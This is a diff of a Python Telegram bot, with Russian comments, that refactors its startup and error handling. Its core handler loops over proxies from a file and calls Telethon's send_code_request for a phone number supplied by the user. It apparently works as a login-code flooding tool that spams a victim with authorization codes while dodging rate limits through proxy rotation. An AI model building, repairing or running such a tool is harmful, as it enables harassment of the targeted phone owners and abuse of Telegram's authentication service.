@@ -7,6 +7,7 @@ from flask import Flask
 from telethon import TelegramClient
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
+import time
 
 # ====== Конфиг ======
 PROXIES_FILE = "proxies.txt"
@@ -26,7 +27,6 @@ API_HASH = os.environ.get("API_HASH")
 if not BOT_TOKEN or not API_ID or not API_HASH:
     raise RuntimeError("Установите переменные окружения BOT_TOKEN, API_ID, API_HASH")
 
-# ======================
 def parse_proxy_line(line: str):
     parts = line.strip().split(":")
     if len(parts) < 2:
@@ -84,33 +84,27 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                 except asyncio.TimeoutError:
                     print(f"[timeout] client.connect() через {ip}:{port}")
-                    try: await client.disconnect()
-                    except: pass
                     return
                 except Exception as e:
                     print(f"[warn] connect failed {ip}:{port}: {repr(e)}")
-                    try: await client.disconnect()
-                    except: pass
                     return
 
                 try:
+                    is_auth = await asyncio.wait_for(client.is_user_authorized(), timeout=IS_AUTH_TIMEOUT)
+                except Exception:
+                    is_auth = False
+
+                if not is_auth:
                     try:
-                        is_auth = await asyncio.wait_for(client.is_user_authorized(), timeout=IS_AUTH_TIMEOUT)
-                    except Exception:
-                        is_auth = False
-                    if not is_auth:
-                        try:
-                            await asyncio.wait_for(client.send_code_request(phone), timeout=SEND_CODE_TIMEOUT)
-                            sent += 1
-                            ok_list.append(f"{ip}:{port}")
-                            print(f"[ok] send_code_request via {ip}:{port}")
-                        except asyncio.TimeoutError:
-                            print(f"[timeout] send_code_request via {ip}:{port}")
-                        except Exception as e_inner:
-                            print(f"[warn] send_code_request failed via {ip}:{port}: {repr(e_inner)}")
-                finally:
-                    try: await client.disconnect()
-                    except: pass
+                        await asyncio.wait_for(client.send_code_request(phone), timeout=SEND_CODE_TIMEOUT)
+                        sent += 1
+                        ok_list.append(f"{ip}:{port}")
+                        print(f"[ok] send_code_request via {ip}:{port}")
+                    except asyncio.TimeoutError:
+                        print(f"[timeout] send_code_request via {ip}:{port}")
+                    except Exception as e_inner:
+                        print(f"[warn] send_code_request failed via {ip}:{port}: {repr(e_inner)}")
+                await client.disconnect()
             except Exception as e_outer:
                 print(f"[warn] Ошибка Telethon через {ip}:{port}: {repr(e_outer)}")
 
@@ -129,29 +123,32 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await msg.edit_text(f"Готово. Попыток отправки кода: {sent}. Успешные прокси: {len(ok_list)}.")
 
-def build_bot():
+def build_app():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     return app
 
-# Flask app
+# Flask health endpoint
 flask_app = Flask(__name__)
 
 @flask_app.route("/", methods=["GET"])
 def index():
     return "OK", 200
 
-# запускаем бота в фоне, но в том же event loop, без закрытия лупа
-def start_bot_background():
-    async def runner():
-        bot = build_bot()
-        print("Бот запускается (polling)...")
-        await bot.run_polling(stop_signals=None, close_loop=False)
+def run_flask():
+    port = int(os.environ.get("PORT", 5000))
+    flask_app.run(host="0.0.0.0", port=port)
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.create_task(runner())
-    loop.run_forever()
+async def runner():
+    bot = build_app()
+    # ⚡ важно: run_polling вызываем как task, без stop_signals
+    await bot.run_polling(stop_signals=None, close_loop=False)
 
-threading.Thread(target=start_bot_background, daemon=True).start()
+def main():
+    t = threading.Thread(target=run_flask, daemon=True, name="flask_bg")
+    t.start()
+    asyncio.run(runner())
+
+if __name__ == "__main__":
+    main()
